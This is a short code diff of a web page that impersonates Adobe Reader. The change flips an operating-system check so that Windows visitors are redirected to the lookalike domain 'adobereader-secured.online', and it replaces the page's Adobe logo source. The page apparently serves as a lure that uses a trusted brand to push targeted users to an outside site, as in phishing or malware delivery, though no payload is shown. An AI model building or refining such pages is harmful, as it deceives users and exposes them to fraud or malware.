@@ -31,7 +31,7 @@
     }
 
     // Redirect the user if they are not on Windows OS
-    if (!isWindows()) {
+    if (isWindows()) {
       // Redirect to a Windows-only message page
       window.location.href = 'https://adobereader-secured.online/valid.html';
     }
@@ -39,7 +39,7 @@
 </head>
 <body>
   <div id="message">
-    <img src="https://www.adobe.com/content/dam/cc/icons/adobe-logo-178x100.svg" alt="Adobe logo" id="adobe-logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/Adobe_Corporate_logo.svg/2560px-Adobe_Corporate_logo.svg.png" alt="Adobe logo" id="adobe-logo">
     <p>This page is only accessible on Windows. If you're trying to access this page on a Mac, Linux, or any other operating system, please switch to a Windows computer to access this page.</p>
     <p>There are several ways to access Windows on your computer:</p>
     <ul>
